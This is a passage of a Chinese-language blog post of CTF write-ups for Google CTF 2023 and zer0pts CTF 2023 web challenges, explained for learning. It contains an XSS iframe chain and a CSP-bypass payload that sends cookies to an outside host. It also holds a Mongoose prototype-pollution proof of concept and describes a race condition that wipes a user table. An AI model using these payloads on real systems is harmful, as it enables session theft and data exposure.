<span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'createXssFrame'</span><span class="token punctuation">)</span>    window<span class="token punctuation">.</span>xssFrame <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span>src <span class="token operator">=</span> url    xssFrame<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> <span class="token string">'allow-modals allow-scripts allow-top-navigation allow-same-origin'</span>    xssFrame<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">            const blob = new Blob(['&lt;html>&lt;head>&lt;script src="YOUR PAYLOAD HERE" />&lt;script>alert(1)&lt;/scr' + 'ipt>&lt;/head>&lt;body>&lt;div />&lt;/body>&lt;/html>'], &#123;                type: 'text/html'            &#125;);            url = URL.createObjectURL(blob)            console.log(url)            window.top.location = url    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    xssFrame<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'xss frame loaded'</span><span class="token punctuation">)</span>      window<span class="token punctuation">.</span>xssFrame<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">          &lt;script>            top.frames[1].document.open()            console.log('writing');            console.log('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>');            top.frames[1].document.write('&lt;script>' + window.parent.name + '&lt;/scr' + 'ipt>')          &lt;\/script></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token literal-property property">mimeType</span><span class="token operator">:</span> <span class="token string">"text/html"</span><span class="token punctuation">,</span> <span class="token literal-property property">sandbox</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"allow-modals"</span><span class="token punctuation">,</span> <span class="token string">"allow-scripts"</span><span class="token punctuation">,</span> <span class="token string">"allow-top-navigation"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">"allow-same-origin"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>xssFrame<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">createBombFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"sleeping"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"creating broken frame"</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> <span class="token function">createBrokenFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token function">createXssFrame</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">,</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'got message'</span><span class="token punctuation">,</span> e<span class="token punctuation">,</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重點是做這個多事情，就只是為了把 main domain 作為 iframe 載入，就這樣而已。</p><p>而再來就卡關了，原因是沒辦法繞過這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">previewIframe</span><span class="token punctuation">(</span>body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> shimUrl<span class="token punctuation">,</span> container<span class="token punctuation">,</span> sandbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'allow-scripts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>shimUrl<span class="token punctuation">)</span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>host <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">sbx-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">generateRandomPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>url<span class="token punctuation">.</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    url<span class="token punctuation">.</span>searchParams<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'o'</span><span class="token punctuation">,</span> window<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span>src <span class="token operator">=</span> url<span class="token punctuation">;</span>    container<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span><span class="token punctuation">;</span>    iframe<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        iframe<span class="token punctuation">.</span>contentWindow<span class="token operator">?.</span><span class="token function">postMessage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> body<span class="token punctuation">,</span> mimeType<span class="token punctuation">,</span> sandbox<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">once</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我們不知道那個 random domain 是什麼，所以沒辦法 postMessage，會被檢查擋住。如果能知道 random domain 的話就好辦了。</p><p>接著找了一堆 spec，看了 Chromium source code 跟 bug tracker，但還是沒什麼進展。最多就是找到這個：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1">Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank</a>，雖然就是我們要的但是已經修復了。</p><p>一直到比賽結束前十分鐘，隊友找到了 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins">location.ancestorOrigins</a> 這屬性，我才知道原來 child iframe 可以拿到 ancestor 的 origin，之前從來沒發現過（儘管它就在 location 的第一個屬性…）</p><p>時機限制的關係最後沒做出來，就差最後幾步而已了。</p><p>再來的步驟是把那個有 flag 的 blob iframe 導到我們準備好的 blob page，可以用 <code>location.ancestorOrigins</code> leak 出 sandbox domain：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;script>top.postMessage(location.ancestorOrigins[0],"*")&lt;\/script>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再來我們知道了 sandbox domain 以後，就可以在這個 domain 上拿到 XSS，拿到了 XSS 以後，就可以存取 sandbox domain，此時雖然 iframe 的 location 已經變了，但是 iframe 的 src 不會換，所以可以直接拿到有 flag 的 blob src，拿到之後只要 fetch 就可以取得 flag：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>top<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>當初如果多個一兩個小時應該就可以做出來了，殘念。</p><p>最後附一下作者 exploit，滿值得學習的：<a href="https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html">https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html</a></p><h3><span id="noteninja-3-solves">NOTENINJA (3 solves)</span></h3><p>這題基本上可以插入任意 HTML 但重點是 CSP：<code>script-src &#39;self&#39; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;</code></p><p>原本以為這題用了 Next.js，會是跟之前 <a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022</a> 很像的做法，但試了很久都沒弄出來，賽後才知道原來這題就只是找到 recaptcha 的 CSP gadget…</p><p>在 recaptcha 網站裡面有個 angular 可以拿來當作 gadget，因此最後的解法是：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">++++++++++++++++++++++++++++++++++++++<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span>  <span class="token attr-name">ng-controller</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>CarouselController as c<span class="token punctuation">"</span></span>  <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>c.init()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>&amp;#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">carousel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">slides</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://www.google.com/recaptcha/about/js/main.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>++++++++++++++++++++++++++++++++++++++<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也算是學到一個比較少人知道的 CSP bypass 了</p><p>然後有另一支隊伍直接找到了一個 Mongoose 的 0day：<a href="https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose</a></p><p>原因在程式碼的這一行：<a href="https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74">https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> Note<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>req<span class="token punctuation">.</span>body<span class="token punctuation">,</span> <span class="token literal-property property">htmlDescription</span><span class="token operator">:</span> htmlDescription <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接把整個 body 吃進去，然後就可以透過 <code>$rename</code> 弄出一個 prototype pollution：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> connect<span class="token punctuation">,</span> model<span class="token punctuation">,</span> Schema <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">'mongoose'</span><span class="token punctuation">;</span><span class="token keyword">await</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token string">'mongodb://127.0.0.1:27017/exploit'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> Example <span class="token operator">=</span> <span class="token function">model</span><span class="token punctuation">(</span><span class="token string">'Example'</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Schema</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> String <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> example <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'world!'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">findByIdAndUpdate</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span>_id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">$rename</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">hello</span><span class="token operator">:</span> <span class="token string">'__proto__.polluted'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// this is what causes the pollution</span><span class="token keyword">await</span> Example<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> test <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>polluted<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// world!</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [Object: null prototype] &#123; polluted: 'world!' &#125;</span>process<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>透過這個 prototype pollution 的洞，可以讓 <code>find()</code> dump 出所有的資料，就可以看到其他人的 note。</p><h2><span id="zer0ptsctf-2023">zer0ptsCTF 2023</span></h2><p>先補幾個 reference：</p><ol><li><a href="https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119">zer0pts CTF writeup (in English)</a></li><li><a href="https://blog.arkark.dev/2023/07/17/zer0pts-ctf/">zer0pts CTF 2023 writeup (4 web challs)</a></li><li><a href="https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/">zer0pts CTF 2023 Writeups</a></li></ol><p>每題的完整程式碼都在這裡：<a href="https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web">https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web</a></p><h3><span id="warmuprofile-48-solves">Warmuprofile (48 solves)</span></h3><p>這題滿有趣的，你可以新增跟刪除使用者，目標是建立一個 admin user，但是 admin 已經存在了，所以要想辦法把它刪掉。</p><p>刪除的程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/user/:username/delete'</span><span class="token punctuation">,</span> needAuth<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>params<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> loggedInUsername <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>loggedInUsername <span class="token operator">!==</span> <span class="token string">'admin'</span> <span class="token operator">&amp;&amp;</span> loggedInUsername <span class="token operator">!==</span> username<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">flash</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> <span class="token string">'general user can only delete itself'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// find user to be deleted</span>    <span class="token keyword">const</span> user <span class="token operator">=</span> <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">findOne</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> username <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">await</span> User<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">where</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span>user<span class="token operator">?.</span>dataValues <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// user is deleted, so session should be logged out</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果仔細看仔細想的話，會發現這邊有個問題。</p><p>那就是如果你同時開兩個 tab 登入，那兩個 session 的 username 都會有東西，接著在其中一個頁面刪除使用者，刪完以後另外一個也做相同操作。</p><p>此時 <code>User.findOne</code> 會因為資料庫裡面已經沒有這個使用者而回傳 <code>null</code>，執行到 <code>User.destroy</code> 時就會變成 <code>where: &#123;&#125;</code>，變成刪除資料庫裡面所有的東西，就可以把 admin 給刪掉。</p><h3><span id="jqi-40-solves">jqi (40 solves)</span></h3><p>這題你設定條件以後會執行相對應的 jq 指令，我也是看到這題才發現原來 jq 這麼多功能。</p><p>最主要的程式碼是這一段：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token constant">KEYS</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'tags'</span><span class="token punctuation">,</span> <span class="token string">'author'</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/api/search'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> keys <span class="token operator">=</span> <span class="token string">'keys'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>keys<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">KEYS</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> conds <span class="token operator">=</span> <span class="token string">'conds'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>query <span class="token operator">?</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>conds<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>keys<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span> <span class="token operator">||</span> conds<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key or cond'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// build query for selecting keys</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> keys<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> keysQuery <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">key</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>key<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// build query for filtering results</span>    <span class="token keyword">let</span> condsQuery <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> cond <span class="token keyword">of</span> conds<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">[</span>str<span class="token punctuation">,</span> key<span class="token punctuation">]</span> <span class="token operator">=</span> cond<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">' in '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">KEYS</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">error</span><span class="token operator">:</span> <span class="token string">'invalid key'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// check if the query is trying to break string literal</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token 